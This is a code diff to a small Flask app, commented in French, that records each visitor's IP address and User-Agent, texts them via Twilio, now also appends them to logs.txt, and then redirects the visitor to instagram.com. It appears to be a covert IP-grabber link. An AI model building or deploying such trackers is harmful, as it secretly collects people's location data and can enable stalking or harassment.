@@ -1,5 +1,6 @@
 from flask import Flask, request, redirect
 from twilio.rest import Client
+from datetime import datetime
 import traceback
 
 app = Flask(__name__)
@@ -24,7 +25,19 @@ def send_sms(ip_address, user_agent):
         print(f"✅ Message sent: {message.sid}")
     except Exception as e:
         print("❌ Error sending SMS:")
-        traceback.print_exc()  # Affiche les détails de l'erreur dans la console
+        traceback.print_exc()
+
+# Fonction d'enregistrement dans logs.txt
+def log_to_file(ip_address, user_agent):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_line = f"[{timestamp}] IP: {ip_address}, User-Agent: {user_agent}\n"
+    try:
+        with open("logs.txt", "a") as log_file:
+            log_file.write(log_line)
+        print("📝 Logged to logs.txt")
+    except Exception as e:
+        print("❌ Error writing to logs.txt:")
+        traceback.print_exc()
 
 # Route principale
 @app.route('/')
@@ -34,8 +47,9 @@ def index():
     print(f"🔎 IP: {ip_address}, User-Agent: {user_agent}")
 
     send_sms(ip_address, user_agent)
+    log_to_file(ip_address, user_agent)
 
-    return redirect("https://www.instagram.com")  # Redirection personnalisée
+    return redirect("https://www.instagram.com")  # Remplace par ton URL
 
 # Lancement du serveur
 if __name__ == '__main__':
